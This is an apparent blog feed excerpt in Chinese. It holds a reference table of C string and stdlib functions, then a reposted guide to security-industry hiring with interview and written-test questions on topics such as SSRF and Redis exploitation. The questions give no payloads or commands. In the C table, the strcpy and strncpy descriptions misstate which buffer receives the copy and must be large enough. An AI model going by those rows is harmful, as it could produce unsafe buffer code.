<strong>stream</strong> 中</td></tr></tbody></table><h4 id="2字符串函数stringh"><a class="markdownIt-Anchor" href="#2字符串函数stringh"></a> 2.字符串函数（&lt;string.h&gt;）</h4><p><code>字符串函数</code></p><p>所有字符串函数列在下表里，函数描述采用如下约定：s、t表示 (char *)类型的参数，cs、ct表示(const char*)类型的参数（它们都应表示字符串）。n表示size_t类型的参数（size_t是一个无符号的整数类型），c是整型参数（在函数里转换到char）：</p><table><thead><tr><th>函数原型</th><th>意义解释</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strlen.html" target="_blank" rel="noopener">size_t strlen(const char *str)</a></td><td>计算字符串 str 的长度，直到空结束字符，但不包括空结束字符。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strcpy.html" target="_blank" rel="noopener"> char *strcpy(char *dest, const char *src)</a></td><td>把 <em>src</em> 所指向的字符串复制到 <em>dest</em>。要求src指定足够大的字符数组</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strncpy.html" target="_blank" rel="noopener">char *strncpy(char *dest, const char *src, size_t n)</a></td><td>把src里的至多n个字符复制到src。<br>要求dest指定一个足够大的字符数组。如果src里的字符不够n个，就在dest里填充空字符。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strcat.html" target="_blank" rel="noopener"> char *strcat(char *dest, const char *src)</a></td><td>把 <em>src</em> 所指向的字符串追加到 <em>dest</em> 所指向的字符串的结尾。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strncat.html" target="_blank" rel="noopener"> char *strncat(char *dest, const char *src, size_t n)</a></td><td>把src里的至多n个字符复制到s里已有的字符串之后。<br>dest应指定一个保存着字符串，而且足够大的字符数组</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strcmp.html" target="_blank" rel="noopener"> int strcmp(const char *str1, const char *str2)</a></td><td>比较字符串str1和str2的大小，在str1大于、等于、小于str2时分别返回正值、0、负值。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strncmp.html" target="_blank" rel="noopener"> int strncmp(const char *str1, const char *str2, size_t n)</a></td><td>比较字符串str1和str2的大小，至多比较n个字符。<br>在str1大于、等于、小于str2时分别返回正值、0、负值。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strchr.html" target="_blank" rel="noopener">char *strchr(const char *str, int c)</a></td><td>在str中查寻c并返回c第一个出现的位置，用指向这个位置的指针表示。<br>当str里没有 c 时返回值NULL</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strrchr.html" target="_blank" rel="noopener">char *strrchr(const char *str, int c)</a></td><td>在str中查寻 c 并返回 c 最后一个出现的位置，没有时返回NULL</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strspn.html" target="_blank" rel="noopener">size_t strspn(const char *str1, const char *str2)</a></td><td>检索字符串 <em>str1</em> 中第一个不在字符串 <em>str2</em> 中出现的字符下标。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strcspn.html" target="_blank" rel="noopener">size_t strcspn(const char *str1, const char *str2)</a></td><td>检索字符串 str1 开头连续有几个字符都不含字符串 str2 中的字符，返回其长度</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strpbrk.html" target="_blank" rel="noopener">char *strpbrk(const char *str1, const char *str2)</a></td><td>在str1里查寻str2里的字符，返回第一个满足条件的字符出现的位置，没有时返回NULL</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strstr.html" target="_blank" rel="noopener">char *strstr(const char *haystack, const char *needle)</a></td><td>在haystack中查寻串needle（查询子串），返回needle作为haystack的子串的第一个出现的位置，needle未出现在haystack里时返回NULL</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-strerror.html" target="_blank" rel="noopener">char *strerror(int errnum)</a></td><td>返回与错误编号errnum相关的错误信息串（指向该错误信息串的指针）</td></tr><tr><td><a href>char *strtok(s,ct)</a></td><td>在s中查寻由ct中的字符作为分隔符而形成的单词</td></tr></tbody></table><p><code>存储区操作</code></p><p>&lt;string.h&gt;还有一组字符数组操作函数（存储区操作函数），名字都以mem开头，以某种高效方式实现。在下面原型中，参数s和t的类型是(void *)，cs和ct的类型是(const void *)，n的类型是size_t，c的类型是int（转换为unsigned char）。</p><table><thead><tr><th>函数原型</th><th>意义解释</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/cprogramming/c-function-memcpy.html" target="_blank" rel="noopener">void *memcpy(void *dest, const void *src, size_t n)</a></td><td>从src处复制n个字符到dest处，返回dest</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-memmove.html" target="_blank" rel="noopener">void *memmove(void *dest, const void *src, size_t n)</a></td><td>从src处复制n个字符到dest处，返回dest，这里的两个段允许重叠</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-memcmp.html" target="_blank" rel="noopener">int memcmp(const void *str1, const void *str2, size_t n)</a></td><td>比较由str1和str2开始的n个字符，返回值定义同strcmp</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-memchr.html" target="_blank" rel="noopener"> void *memchr(const void *str, int c, size_t n)</a></td><td>在n个字符的范围内查寻c在str中的第一次出现，如果找到，返回该位置的指针值，否则返回NULL</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-memset.html" target="_blank" rel="noopener">void *memset(void *str, int c, size_t n)</a></td><td>复制字符 c（一个无符号字符）到参数 <em>str</em> 所指向的字符串的前 n 个字符，返回str。</td></tr></tbody></table><h4 id="3功能函数stdlibh"><a class="markdownIt-Anchor" href="#3功能函数stdlibh"></a> 3.功能函数（&lt;stdlib.h&gt;）</h4><p><code>动态存储分配函数</code></p><table><thead><tr><th>函数原型</th><th>意义解释</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/cprogramming/c-function-calloc.html" target="_blank" rel="noopener">void *calloc(size_t nitems, size_t size)</a></td><td>分配一块存储，其中足以存放n个大小为size的对象，并将所有字节用0字符填充。<br>返回该存储块的地址。不能满足时返回NULL</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-malloc.html" target="_blank" rel="noopener">void *malloc(size_t size)</a></td><td>分配一块足以存放大小为size的存储，返回该存储块的地址，不能满足时返回NULL</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-realloc.html" target="_blank" rel="noopener">void *realloc(void *ptr, size_t size)</a></td><td>将ptr所指存储块调整为大小size，返回新块的地址。<br>如能满足要求，新块的内容与原块一致；不能满足要求时返回NULL，此时原块不变</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-free.html" target="_blank" rel="noopener">void free(void *ptr)</a></td><td>释放之前调用 <em>calloc、malloc</em> 或 <em>realloc</em> 所分配的内存空间。</td></tr></tbody></table><p><code>随机数函数</code></p><table><thead><tr><th>函数原型</th><th>意义解释</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/cprogramming/c-function-rand.html" target="_blank" rel="noopener">int rand(void)</a></td><td>返回一个范围在 0 到 <em>RAND_MAX</em> 之间的伪随机数。</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-srand.html" target="_blank" rel="noopener"> void srand(unsigned int seed)</a></td><td>该函数播种由函数 <strong>rand</strong> 使用的随机数发生器。</td></tr></tbody></table><p><code>数值转换函数</code></p><table><thead><tr><th>函数原型</th><th>意义解释</th></tr></thead><tbody><tr><td><a href="https://www.runoob.com/cprogramming/c-function-atof.html" target="_blank" rel="noopener">double atof(const char *str)</a></td><td>把参数 <em>str</em> 所指向的字符串转换为一个浮点数（类型为 double 型）</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-atoi.html" target="_blank" rel="noopener">int atoi(const char *str)</a></td><td>把参数 <em>str</em> 所指向的字符串转换为一个整数（类型为 int 型）</td></tr><tr><td><a href="https://www.runoob.com/cprogramming/c-function-atol.html" target="_blank" rel="noopener"> long int atol(const char *str)</a></td><td>把参数 <em>str</em> 所指向的字符串转换为一个长整数（类型为 long int 型）</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-常见的标准头&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x00-常见的标准头&quot;&gt;&lt;/a&gt; 0x00 常见的标准头&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.runoob.c
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【转载】Security Interview Questions</title>
    <link href="https://muzibing.github.io/2020/09/13/2020.09.13%EF%BC%88151%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/09/13/2020.09.13（151）/</id>
    <published>2020-09-12T16:00:00.000Z</published>
    <updated>2020-09-13T03:25:17.515Z</updated>
    
    <content type="html"><![CDATA[<p>网络信息安全从业者面试指南</p><blockquote><p>传送门：<a href="https://github.com/FeeiCN/SecurityInterviewQuestions" target="_blank" rel="noopener">Security Interview Questions</a></p></blockquote><h2 id="1-安全招聘现状"><a class="markdownIt-Anchor" href="#1-安全招聘现状"></a> 1 安全招聘现状</h2><h3 id="11-薪酬最高"><a class="markdownIt-Anchor" href="#11-薪酬最高"></a> 1.1 薪酬最高</h3><p>互联网是计算机行业中薪酬最高的，而技术工程师是互联网中薪酬最高的，而安全工程师又是技术工程师中最高的。安全行业井喷式的爆发，使得每家互联网企业的安全部门成为标配并逐渐蔓延开来，而由于高校的安全专业才开始普及，安全从业人员紧缺且入门门槛较高从而导致了薪酬水涨船高。</p><h3 id="12-良莠不齐"><a class="markdownIt-Anchor" href="#12-良莠不齐"></a> 1.2 良莠不齐</h3><p>好处是会有更多的人投身于安全，当然坏处也很明显，着急的岗位和紧缺人员导致存在大量良莠不齐的人在其中浑水摸鱼，明显的特征是你跟他聊技术细节他跟你聊推进落地，你跟他聊推进落地他跟你聊方向把控，你跟他聊方向把控他跟你聊团队管理，你跟他聊团队管理他跟你聊行业空间，如果这些方面都能聊一点那也行，更多的人是<strong>答非所问</strong>又或者<strong>句句有理但空洞没有屁用</strong>，又或者是今天这里听到一个理论还没弄明白呢明天就来跟你拽个概念，虽然这么说会得罪一部分人。</p><h3 id="13-圈子文化"><a class="markdownIt-Anchor" href="#13-圈子文化"></a> 1.3 圈子文化</h3><p>安全是一个小圈子，圈内的事情传播的非常快，比如谁家数据库泄露了、谁家被薅羊毛了、谁被抓了、谁被处罚了，这也是小圈子最大的好处，圈内的人很快能知道这个行业的新技术、新方向、新政策。你也可以很容易的知道每家公司的安全建设情况，比如你可以和阿里的人聊他们的线下配合公安的手段有多强，也可以和腾讯的人聊他们的SRC如何运营的这么好，也可以和百度的安全人聊如何让机器学习赋能安全产品的，这一切在安全圈内非常的容易。也有很多的安全会议可以学习到每家公司的经验，不用所有的事情都自己摸索也用闭门造车。</p><p>弊端也很明显，搞所谓的”圈子文化“，混迹于各种会议去主动认识各种圈内的人（当然这里不是指各家SRC运营的同学，这些是运营同学的工作一部分），认识的各种人如果是交流技术那也行，加了微信除了打招呼的自我介绍那句话就再也没说过有意义的东西，以为这样就进入了圈中心，可笑可悲。</p><h2 id="2-安全从业人员的必要素质"><a class="markdownIt-Anchor" href="#2-安全从业人员的必要素质"></a> 2 安全从业人员的必要素质</h2><blockquote><p>具备基础的工程师素质是一切的基础，在这个基础之上如果在攻防渗透和软件开发、兴趣驱动和适应能力上比较亮眼，则能很好的适应工作挑战。</p></blockquote><h3 id="21-攻防渗透和软件开发"><a class="markdownIt-Anchor" href="#21-攻防渗透和软件开发"></a> 2.1 攻防渗透和软件开发</h3><p>首先要明确一个概念，术业有专攻在安全行业不是常态。安全本身就是一个覆盖了客户端、前端、网络、后端、服务器等涉及JavaScript、Python、PHP、Java等各语言的工作，如果非要讲究术业有专攻就没法做了，当你可以有擅长的方向，但前提是你都懂，这个懂不应该停留在了解的层面，如果你是安全开发工程师除了研发技能外还必须知道常见漏洞的形成原因、利用方式和修复方案，如果你是渗透工程师除了理解各种漏洞的攻击细节外，还必须有基本的开发能力。</p><p>同时拥有攻防渗透和软件开发的人，在后面做事的方方面面会体现出极大的优势。</p><p>我们有过很资深研发工程师，但安全产品不同于用户产品，往往是都没有经验也没有参照物的，摸黑前行最好的情况是你曾住过这个房子，所以往往需要有很强的安全背景/不断的试错调整才能开发最好的产品。甚至在很多时候，沟通交流/思维上都需要进行转变才能更好的协作，减少代沟和沟通成本。这个要求并不是非要精通各种。</p><p>现状是安全行业更多的人是偏向于攻防渗透，而如果同时拥有很强的开发技能，优势将非常明显。在安全产品开发/漏洞挖掘/代码审计上。</p><p>不同岗位间的互补显得非常重要，做漏洞扫描器的如果在SRC挖过漏洞、做代码审计如果会软件开发、做合规审计的如果有CISP证书就会得心应手。</p><h3 id="22-兴趣驱动"><a class="markdownIt-Anchor" href="#22-兴趣驱动"></a> 2.2 兴趣驱动</h3><p>像安全产品开发一样，渗透测试也需要不断的试错，不断的将各种可能存在漏洞的地方一一测试，往往测试数百个请求才有所收获，这需要很好的坚持，但坚持这种品质无法立刻学会，但往往有很多东西能促使我们坚持，比如兴趣。我对于安全的坚持就是兴趣所驱动的，我会遇到一个线索从早上折腾到凌晨，会因为一个突破点从晚上摸索到下午。 我见过太多优秀的白帽子都是因为热爱，他们能跨行业的热爱。</p><h3 id="23-适应能力"><a class="markdownIt-Anchor" href="#23-适应能力"></a> 2.3 适应能力</h3><p>软件工程师是三年换一轮新技术，而安全工程师则是每年都有新的方向。每天都会有新的漏洞/新的攻击方式/新的语言漏洞，每年也会有新的安全技术、安全防御手段、安全方向，而应对别无他法唯学习，良好的自驱自学能力是一切的基础。</p><h2 id="3-安全面试和笔试"><a class="markdownIt-Anchor" href="#3-安全面试和笔试"></a> 3 安全面试和笔试</h2><blockquote><p>如何有效的甄别一些滥竽充数的人，最重要的肯定是面试这道坎。安全圈的东西行业内的人谁都能聊一点，所以一轮面试一定得安全技术负责人亲自把关，深入的问细节来判断。</p></blockquote><h3 id="31-面试注意项"><a class="markdownIt-Anchor" href="#31-面试注意项"></a> 3.1 面试注意项</h3><ul><li>提前约好面试时间和面试方式（电话/现场）</li><li>准时参与面试，有事情应提前电话沟通到位</li><li>面试时把握好节奏，及时阻止话多的，多留停顿给话少的</li><li>面试时不问/不透露公司敏感信息</li><li>即使只聊一分钟就觉得面试者不合适，也不应该立即挂断，面试应不少于20分钟</li></ul><h3 id="32-面试流程"><a class="markdownIt-Anchor" href="#32-面试流程"></a> 3.2 面试流程</h3><ul><li>自我介绍下个人情况、做过的项目和技能<ul><li>观察谈吐，看思维逻辑是否有条理，沟通交流是否顺畅</li><li>性格类型是否合适</li></ul></li><li>围绕做过的项目进行细节提问，提问的问题根据岗位不同可以从3.2中抽取<ul><li>考察项目真实性、项目角色及分工</li><li>对项目的理解程度、掌握程度、思考等</li></ul></li><li>遇到解决不了的问题怎么做？<ul><li>考察学习能力和动手解决能力</li></ul></li><li>CTF、乌云、翻墙、写技术博客、技术书籍、参与GitHub开源项目、常浏览的网站、游戏、电视剧、业余时间干嘛、业内牛人<ul><li>综合体现出其技术热度</li></ul></li><li>算法、前端、服务器的掌握程度<ul><li>一些基础算法，比如快速排序、冒泡排序、选择排序、插入排序</li><li>一些机器学习算法，CNN、RNN、Tensorflow、验证码识别等等</li><li>前端JavaScript、HTML、CSS掌握程度，调试工具，编码等</li><li>服务器常用命令、配置、文件权限、进程栈、端口占用、异常日志等</li></ul></li><li>自认为自己比身边人的优势<ul><li>挖掘亮点，如何客观看待自己</li></ul></li><li>自认为的缺点<ul><li>客观的自我评价，讲自己没有缺点的基本可以不要了</li></ul></li><li>最有成就感的事情<ul><li>考察价值观，尤其对于一些未授权渗透甚至黑灰产事情的态度</li></ul></li><li>未来职业规划？<ul><li>请否有清晰的职业规划，对自己未来有长远思考</li><li>和当前岗位对匹配度</li></ul></li><li>还有什么要问我的吗？<ul><li>了解面试者所关心的侧重点</li></ul></li></ul><h3 id="33-面试题目"><a class="markdownIt-Anchor" href="#33-面试题目"></a> 3.3 面试题目</h3><h4 id="渗透测试web方向"><a class="markdownIt-Anchor" href="#渗透测试web方向"></a> 渗透测试（Web方向）</h4><ul><li>挑选两到四个不同方向常见和不常见的漏洞，就漏洞原理、利用方式和修复方案进行提问，然后根据回答的情况进行详细深入的二次提问<ul><li>Redis未授权访问漏洞如何入侵利用？</li><li>SSRF漏洞原理、利用方式及修复方案？Java和PHP的SSRF区别？</li><li>宽字节注入漏洞原理、利用方式及修复方案？</li><li>简述JSONP的业务意义，JSONP劫持利用方式及修复方案？</li><li>CRLF注入原理？</li><li>URL白名单绕过？</li><li>XSS持久化？</li></ul></li><li>渗透全流程</li><li>就漏洞的检测发现进行提问<ul><li>越权问题如何检测？</li><li>黑盒如何检测XSS漏洞？</li><li>如果爬取更多的请求？</li></ul></li><li>应急思考<ul><li>有哪几种后门实现方式？</li><li>webshell检测有什么方法思路？</li><li>Linux服务器中了木马后，请简述应急思路？</li><li>遇到新0day(比如Struts2)后，应该如何进行应急响应？</li><li>新业务上线前可以从哪些方向进行安全评估？</li><li>现有系统可以从哪些方向进行审计发现其中的安全风险？</li></ul></li><li>基础开发<ul><li>简述Python装饰器、迭代器、生成器原理及应用场景？</li><li>简述Python进程、线程和协程的区别及应用场景？</li></ul></li></ul><h4 id="安全开发java方向"><a class="markdownIt-Anchor" href="#安全开发java方向"></a> 安全开发（Java方向）</h4><ul><li>Java基础<ul><li>Java虚拟机区域如何划分？</li><li>HashMap和HashTable、ConcurrentHashMap的区别？</li><li>进程和线程区别，进程间、线程间通信有哪几种方式？</li><li>Java BIO/NIO/AIO是什么？适用哪些场景？</li></ul></li><li>算法基础<ul><li>快速排序的过程和复杂度？</li><li>冒泡排序的过程和复杂度？</li><li>CNN对比RNN区别？</li></ul></li><li>业务基础<ul><li>调试工具及异常排查流程？</li><li>数据库索引结构，什么情况下应该建唯一索引？</li><li>数据库分页语句如何写？</li></ul></li><li>业务安全<ul><li>HTTPS交互过程</li><li>OAuth2.0交互过程及其中可能存在的配置不当安全风险</li><li>对称加密和非对称加密的区别及优缺点</li><li>获取一个入参url，请求url地址的内容时应注意什么？</li><li>参数入库前应该如何过滤？</li><li>过滤器和拦截器原理和应用场景？</li><li>SESSION ID如何不被Javascript读取？</li><li>CSRF的Token如何设计？</li><li>同源策略？如何实现跨域请求？</li></ul></li></ul><h4 id="安全运营合规审计方向"><a class="markdownIt-Anchor" href="#安全运营合规审计方向"></a> 安全运营（合规审计方向）</h4><ul><li>对于内控、合规、审计的理解<ul><li>考察其对于要做的事情和岗位要求、公司环境是否匹配</li><li>考察其大局上考虑是否周全或是片面</li></ul></li><li>传统行业和互联网行业的安全建设的区别及各自的优劣势<ul><li>是否能准确的抓住核心原因</li></ul></li><li>信息安全等级保护、网络安全法、GDPR<ul><li>挑选一到两个问其对其的来源理解以及落地程度取舍</li></ul></li><li>数据安全治理可以用什么思路做？</li><li>如何通过技术手段实现对异常操作的自动化监控？</li><li>如何对一个应用进行安全评估？</li><li>如何对一个应用进行安全审计？</li><li>如何理解权限分离、最小化权限？</li><li>考察一些CISP、CISSP的知识点</li><li>流程的设计<ul><li>挑选一些较为复杂的流程，比如转岗、离职等，如何设计考虑其中的细节</li></ul></li></ul><h4 id="安全架构安全管理方向"><a class="markdownIt-Anchor" href="#安全架构安全管理方向"></a> 安全架构（安全管理方向）</h4><ul><li>渗透测试、安全研发、安全运营的问题可以挑选的问一些，以确保在各个方向上比较均衡</li><li>对于企业不同时期、不同阶段、不同体量的安全建设的方法、区别以及侧重</li><li>你所做过的安全架构图和所期望的安全架构</li><li>安全与其他团队（运维、研发、测试、GR/PR、内控、高管及三方安全公司）的关系</li><li>安全建设的理念/方法论理解<ul><li>纵深防御</li><li>木桶原理</li><li>由外而内</li><li>先低后上</li><li>能口不点</li><li>最小权限</li><li>权限分离</li><li>白名单和黑名单</li><li>漏洞和误报</li><li>规则经验和机器学习</li><li>漏洞危害证明</li><li>技术管控与意识提升的关系</li><li>安全推进方法</li><li>自研OR外采？</li><li>找到总的核心目标和各个项目的主要目标</li><li>创新和极致</li><li>责任分担</li><li>黑天鹅和灰犀牛</li></ul></li><li>衡量企业安全建设的水平</li><li>不同公司间的安全区别或差别是什么？比如腾讯和阿里，百度和京东</li><li>如何制定公司安全建设的三年甚至五年计划</li><li>未来安全行业的发展方向？</li></ul><h3 id="34-笔试题目"><a class="markdownIt-Anchor" href="#34-笔试题目"></a> 3.4 笔试题目</h3><blockquote><p>面试题目往往大同小异，而由于圈子小的原因很容易传播出去，如果做过准备哪怕深入的问也可能有漏网之鱼。而笔试往往能很好的看出来其动手能力，所以应尽可能的出一些无法提前预知、无法网上查询的专属题目，题目可以侧重于开发、调试、数据操作等方面。</p></blockquote><h4 id="渗透测试方向"><a class="markdownIt-Anchor" href="#渗透测试方向"></a> 渗透测试方向</h4><ul><li>给定一个漏洞靶场，在一定时间内找出最多漏洞数</li><li>给定一个匿名访问Redis，请GET SHELL</li><li>给一个项目场景进行安全评估（e.g.与三方厂商进行API交互）</li></ul><h4 id="软件开发方向"><a class="markdownIt-Anchor" href="#软件开发方向"></a> 软件开发方向</h4><ul><li>读取一个文件第100-200行并发送到一个指定的API接口（着重考察对于各种异常情况的考虑）</li><li>最快的方式获取100万个子域名请求的响应内容并找出其中真实存在的子域名</li></ul><h4 id="数据结构方向"><a class="markdownIt-Anchor" href="#数据结构方向"></a> 数据结构方向</h4><ul><li>给一个数组<code>[3,4,5,6,2,1,8]</code>，输入所有二元组其和为8。<ul><li>每个数字只能用一次</li><li>数组长度不定</li><li>考虑时间复杂度和空间复杂度，以最高效率</li></ul></li><li>存在一个list结构（表1），请转换为树状结构（表2）<ul><li>pid和id关系为父子关系</li><li>name为无规律随意命名</li></ul></li></ul><p>表1：list结构（list length&gt;1000）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'111'</span>,</span><br><span class="line">    <span class="string">'pid'</span>: <span class="string">'0'</span>,</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'A1'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'222'</span>,</span><br><span class="line">    <span class="string">'pid'</span>: <span class="string">'111'</span>,</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'A-B1'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'223'</span>,</span><br><span class="line">    <span class="string">'pid'</span>: <span class="string">'111'</span>,</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'A-B2'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'224'</span>,</span><br><span class="line">    <span class="string">'pid'</span>: <span class="string">'111'</span>,</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'A-B3'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'333'</span>,</span><br><span class="line">    <span class="string">'pid'</span>: <span class="string">'223'</span>,</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'A-B2-C1'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">'444'</span>,</span><br><span class="line">    <span class="string">'pid'</span>: <span class="string">'333'</span>,</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'A-B2-C1-D1'</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>表2：最终的结构</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">'id'</span>: <span class="string">'111'</span>,</span><br><span class="line">  <span class="string">'pid'</span>: <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">'name'</span>: <span class="string">'A1'</span>,</span><br><span class="line">  <span class="string">'child'</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">'id'</span>: <span class="string">'222'</span>,</span><br><span class="line">      <span class="string">'pid'</span>: <span class="string">'111'</span>,</span><br><span class="line">      <span class="string">'name'</span>: <span class="string">'A-B1'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">'id'</span>: <span class="string">'223'</span>,</span><br><span class="line">      <span class="string">'pid'</span>: <span class="string">'111'</span>,</span><br><span class="line">      <span class="string">'name'</span>: <span class="string">'A-B2'</span>,</span><br><span class="line">      <span class="string">'child'</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">'id'</span>: <span class="string">'333'</span>,</span><br><span class="line">          <span class="string">'pid'</span>: <span class="string">'223'</span>,</span><br><span class="line">          <span class="string">'name'</span>: <span class="string">'A-B2-C1'</span>,</span><br><span class="line">          <span class="string">'child'</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="string">'id'</span>: <span class="string">'444'</span>,</span><br><span class="line">              <span class="string">'pid'</span>: <span class="string">'333'</span>,</span><br><span class="line">              <span class="string">'name'</span>: <span class="string">'A-B2-C1-D1'</span></span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">'id'</span>: <span class="string">'224'</span>,</span><br><span class="line">      <span class="string">'pid'</span>: <span class="string">'111'</span>,</span><br><span class="line">      <span class="string">'name'</span>: <span class="string">'A-B3'</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-招聘渠道"><a class="markdownIt-Anchor" href="#4-招聘渠道"></a> 4 招聘渠道</h2><h3 id="41-公司内部推荐"><a class="markdownIt-Anchor" href="#41-公司内部推荐"></a> 4.1 公司内部推荐</h3><blockquote><p>内推是优于招聘网站或猎头的，和找女朋友一样，熟人介绍的比媒婆介绍的要好，更不用说相亲网站的质量了。对于中高端岗位公司需要支付较高的猎头费用，所以内推渠道优于其它所有。</p></blockquote><ul><li>找到自己倾向的公司以及对应的招聘岗位<ul><li>注意岗位和个人技能及职业发展的匹配度</li></ul></li><li>找到对应公司员工请求内部推荐简历<ul><li>优先安全岗位的，其次同公司的</li><li>优先熟悉自己的，其次自检写好</li></ul></li></ul><h3 id="42-安全行业招聘网站"><a class="markdownIt-Anchor" href="#42-安全行业招聘网站"></a> 4.2 安全行业招聘网站</h3><blockquote><p>没有合适心仪的目标就上招聘网站。</p></blockquote><ul><li><a href="https://job.freebuf.com" target="_blank" rel="noopener">FreeBuf</a> - 安全行业垂直招聘网站</li><li><a href="https://www.lagou.com/zhaopin/wangluoanquan/" target="_blank" rel="noopener">拉钩</a> - 互联网垂直招聘</li><li><a href="https://www.zhipin.com/c101210100-p100407/" target="_blank" rel="noopener">BOSS直聘</a> - 负责人1对1</li><li><a href="https://www.liepin.com/zpwangluoanquan/" target="_blank" rel="noopener">猎聘</a> - 猎头招聘</li><li>智联招聘、前程无忧、LinkedIn</li></ul><h2 id="5-好的简历"><a class="markdownIt-Anchor" href="#5-好的简历"></a> 5 